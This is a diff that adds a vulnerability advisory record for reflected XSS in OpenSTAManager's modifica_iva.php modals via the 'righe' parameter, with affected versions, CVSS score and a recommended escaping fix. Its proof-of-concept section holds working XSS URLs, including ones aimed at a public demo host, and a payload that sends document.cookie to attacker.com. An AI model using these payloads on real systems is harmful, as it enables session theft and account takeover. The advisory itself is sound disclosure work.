@@ -1,0 +1,222 @@
+advisory_id: GHSA-jfgp-g7x7-j25j
+datasource_id: github_osv/GHSA-jfgp-g7x7-j25j
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-jfgp-g7x7-j25j/GHSA-jfgp-g7x7-j25j.json
+aliases:
+  - CVE-2026-24415
+summary: |
+  OpenSTAManager Affected by XSS in modifica_iva.php via righe parameter
+  ### Summary
+
+  Multiple Reflected Cross-Site Scripting (XSS) vulnerabilities in OpenSTAManager v2.9.8 allow unauthenticated attackers to execute arbitrary JavaScript code in the context of other users' browsers through crafted URL parameters, potentially leading to session hijacking, credential theft, and unauthorized actions.
+
+  **Vulnerable Parameter:** `righe` (GET)
+
+  ### Details
+
+  OpenSTAManager v2.9.8 contains multiple Reflected XSS vulnerabilities in invoice/order/contract modification modals. The application fails to properly sanitize user-supplied input from the `righe` GET parameter before reflecting it in HTML output.
+
+  **Vulnerable Code Location:**
+  File: `/modules/contratti/modals/modifica_iva.php` (Line 125)
+
+  ```php
+  <input type="hidden" name="righe" value="<?php echo $_GET['righe']; ?>">
+  ```
+
+  The `$_GET['righe']` parameter is directly echoed into the HTML `value` attribute without any sanitization using `htmlspecialchars()` or equivalent functions. This allows an attacker to break out of the attribute context and inject arbitrary HTML/JavaScript.
+
+  **All Affected Files:**
+
+  1. `/modules/contratti/modals/modifica_iva.php` - **Line 125, Line 167**
+  2. `/modules/preventivi/modals/modifica_iva.php` - **Line 125, Line 167**
+  3. `/modules/fatture/modals/modifica_iva.php` - **Line 121, Line 161**
+  4. `/modules/ddt/modals/modifica_iva.php` - **Line 125, Line 167**
+  5. `/modules/ordini/modals/modifica_iva.php` - **Line 125, Line 167**
+  6. `/modules/interventi/modals/modifica_iva.php` - **Line 125, Line 167**
+
+  ### PoC
+
+  **Prerequisites:**
+  - Running instance of OpenSTAManager v2.9.8
+  - Valid admin credentials (username: admin, password: admin for test instance)
+
+  **Step 1: Login**
+  ```bash
+  curl -c cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \
+    -d 'username=admin&password=admin'
+  ```
+
+  **Step 2: Trigger XSS**
+  Navigate to the following URL in a browser (or use curl with cookies):
+  ```
+  http://localhost:8081/modules/contratti/modals/modifica_iva.php?righe="><script>alert(document.domain)</script>
+  ```
+
+  **Tested URLs (All vulnerable):**
+  - `https://demo.osmbusiness.it/modules/contratti/modals/modifica_iva.php?righe="><script>alert(document.cookie)</script>`
+  - `https://demo.osmbusiness.it/modules/preventivi/modals/modifica_iva.php?righe=1"><script>alert(document.cookie)</script>`
+  - `https://demo.osmbusiness.it/modules/fatture/modals/modifica_iva.php?righe="><script>alert(document.cookie)</script>`
+  - `https://demo.osmbusiness.it/modules/ddt/modals/modifica_iva.php?righe="><script>alert(document.cookie)</script>`
+  - `https://demo.osmbusiness.it/modules/ordini/modals/modifica_iva.php?righe="><script>alert(document.cookie)</script>`
+  - `https://demo.osmbusiness.it/modules/interventi/modals/modifica_iva.php?righe="><script>alert(document.cookie)</script>`
+
+  **Expected Result:**
+  JavaScript alert popup displays showing the current session cookie, confirming code execution.
+
+  **HTML Output (verified on live instance):**
+  ```html
+  <input type="hidden" name="righe" value=""><script>alert(document.cookie)</script>">
+  ```
+
+  **Verification:**
+
+  <img width="1260" height="99" alt="image" src="https://github.com/user-attachments/assets/4e91a461-bae6-40fb-b7c3-b8bd1eb48473" />
+
+  <img width="2060" height="1180" alt="image" src="https://github.com/user-attachments/assets/6dbde967-0505-43d1-b455-adc91a4808c0" />
+
+  **Alternative Payloads:**
+  Session stealing: `"><script>fetch('https://attacker.com/?c='+document.cookie)</script>`
+
+  ### Impact
+
+
+  **Affected Users:** All authenticated users with access to contracts, invoices, quotes, or orders modules.
+
+  **Attack Scenario:**
+  1. Attacker crafts malicious URL with XSS payload
+  2. Attacker sends URL to victim via email/chat/phishing
+  3. Victim (authenticated user) clicks the link
+  4. Malicious JavaScript executes in victim's browser context
+  5. Attacker can:
+     - Steal session cookies → Full account takeover
+     - Perform actions on behalf of victim (create/modify/delete records)
+     - Steal CSRF tokens and bypass CSRF protection
+     - Redirect to phishing page
+     - Inject keylogger to capture sensitive data
+     - Modify page content to trick user into revealing credentials
+
+
+  **Recommended Fix:**
+  ```php
+  <input type="hidden" name="righe" value="<?php echo htmlspecialchars($_GET['righe'], ENT_QUOTES, 'UTF-8'); ?>">
+  ```
+
+  Apply this fix to all affected files listed in Details section.
+impacted_packages:
+  - purl: pkg:composer/devcode-it/openstamanager
+    affected_versions: vers:composer/<2.9.8
+    fixed_versions: vers:composer/2.9.8
+    affected_packages:
+      - pkg:composer/devcode-it/openstamanager@2.3.0
+      - pkg:composer/devcode-it/openstamanager@2.4.0
+      - pkg:composer/devcode-it/openstamanager@2.4.1
+      - pkg:composer/devcode-it/openstamanager@2.4.2
+      - pkg:composer/devcode-it/openstamanager@2.4.3
+      - pkg:composer/devcode-it/openstamanager@2.4.4
+      - pkg:composer/devcode-it/openstamanager@2.4.5
+      - pkg:composer/devcode-it/openstamanager@2.4.6
+      - pkg:composer/devcode-it/openstamanager@2.4.7
+      - pkg:composer/devcode-it/openstamanager@2.4.8
+      - pkg:composer/devcode-it/openstamanager@2.4.9
+      - pkg:composer/devcode-it/openstamanager@2.4.10
+      - pkg:composer/devcode-it/openstamanager@2.4.11
+      - pkg:composer/devcode-it/openstamanager@2.4.12
+      - pkg:composer/devcode-it/openstamanager@2.4.13
+      - pkg:composer/devcode-it/openstamanager@2.4.14
+      - pkg:composer/devcode-it/openstamanager@2.4.15
+      - pkg:composer/devcode-it/openstamanager@2.4.16
+      - pkg:composer/devcode-it/openstamanager@2.4.17
+      - pkg:composer/devcode-it/openstamanager@2.4.17%2B1
+      - pkg:composer/devcode-it/openstamanager@2.4.18
+      - pkg:composer/devcode-it/openstamanager@2.4.19
+      - pkg:composer/devcode-it/openstamanager@2.4.20
+      - pkg:composer/devcode-it/openstamanager@2.4.21
+      - pkg:composer/devcode-it/openstamanager@2.4.22
+      - pkg:composer/devcode-it/openstamanager@2.4.23
+      - pkg:composer/devcode-it/openstamanager@2.4.24
+      - pkg:composer/devcode-it/openstamanager@2.4.25
+      - pkg:composer/devcode-it/openstamanager@2.4.26
+      - pkg:composer/devcode-it/openstamanager@2.4.27
+      - pkg:composer/devcode-it/openstamanager@2.4.28
+      - pkg:composer/devcode-it/openstamanager@2.4.29
+      - pkg:composer/devcode-it/openstamanager@2.4.30
+      - pkg:composer/devcode-it/openstamanager@2.4.31
+      - pkg:composer/devcode-it/openstamanager@2.4.32
+      - pkg:composer/devcode-it/openstamanager@2.4.33
+      - pkg:composer/devcode-it/openstamanager@2.4.34
+      - pkg:composer/devcode-it/openstamanager@2.4.35
+      - pkg:composer/devcode-it/openstamanager@2.4.36
+      - pkg:composer/devcode-it/openstamanager@2.4.37
+      - pkg:composer/devcode-it/openstamanager@2.4.38
+      - pkg:composer/devcode-it/openstamanager@2.4.39
+      - pkg:composer/devcode-it/openstamanager@2.4.40
+      - pkg:composer/devcode-it/openstamanager@2.4.41
+      - pkg:composer/devcode-it/openstamanager@2.4.42
+      - pkg:composer/devcode-it/openstamanager@2.4.43
+      - pkg:composer/devcode-it/openstamanager@2.4.44
+      - pkg:composer/devcode-it/openstamanager@2.4.45
+      - pkg:composer/devcode-it/openstamanager@2.4.46
+      - pkg:composer/devcode-it/openstamanager@2.4.47
+      - pkg:composer/devcode-it/openstamanager@2.4.48
+      - pkg:composer/devcode-it/openstamanager@2.4.49
+      - pkg:composer/devcode-it/openstamanager@2.4.50
+      - pkg:composer/devcode-it/openstamanager@2.4.51
+      - pkg:composer/devcode-it/openstamanager@2.4.52
+      - pkg:composer/devcode-it/openstamanager@2.4.53
+      - pkg:composer/devcode-it/openstamanager@2.4.54
+      - pkg:composer/devcode-it/openstamanager@2.5.0
+      - pkg:composer/devcode-it/openstamanager@2.5.1-beta
+      - pkg:composer/devcode-it/openstamanager@2.5.2-beta
+      - pkg:composer/devcode-it/openstamanager@2.5.3
+      - pkg:composer/devcode-it/openstamanager@2.5.4
+      - pkg:composer/devcode-it/openstamanager@2.5.5
+      - pkg:composer/devcode-it/openstamanager@2.5.6
+      - pkg:composer/devcode-it/openstamanager@2.5.7
+      - pkg:composer/devcode-it/openstamanager@2.6.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.6.1
+      - pkg:composer/devcode-it/openstamanager@2.6.2
+      - pkg:composer/devcode-it/openstamanager@2.7.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.7.0
+      - pkg:composer/devcode-it/openstamanager@2.7.1
+      - pkg:composer/devcode-it/openstamanager@2.7.2
+      - pkg:composer/devcode-it/openstamanager@2.7.3
+      - pkg:composer/devcode-it/openstamanager@2.8.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.8.1
+      - pkg:composer/devcode-it/openstamanager@2.8.2
+      - pkg:composer/devcode-it/openstamanager@2.8.3
+      - pkg:composer/devcode-it/openstamanager@2.9.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.9.0
+      - pkg:composer/devcode-it/openstamanager@2.9.1
+      - pkg:composer/devcode-it/openstamanager@2.9.2
+      - pkg:composer/devcode-it/openstamanager@2.9.3
+      - pkg:composer/devcode-it/openstamanager@2.9.4
+      - pkg:composer/devcode-it/openstamanager@2.9.5
+      - pkg:composer/devcode-it/openstamanager@2.9.6
+      - pkg:composer/devcode-it/openstamanager@2.9.7
+    fixed_packages:
+      - pkg:composer/devcode-it/openstamanager@2.9.8
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.1'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-jfgp-g7x7-j25j/GHSA-jfgp-g7x7-j25j.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/devcode-it/openstamanager
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-24415
+    reference_type:
+    reference_id: CVE-2026-24415
+  - url: https://github.com/devcode-it/openstamanager/security/advisories/GHSA-jfgp-g7x7-j25j
+    reference_type:
+    reference_id: GHSA-jfgp-g7x7-j25j
+exploits: []
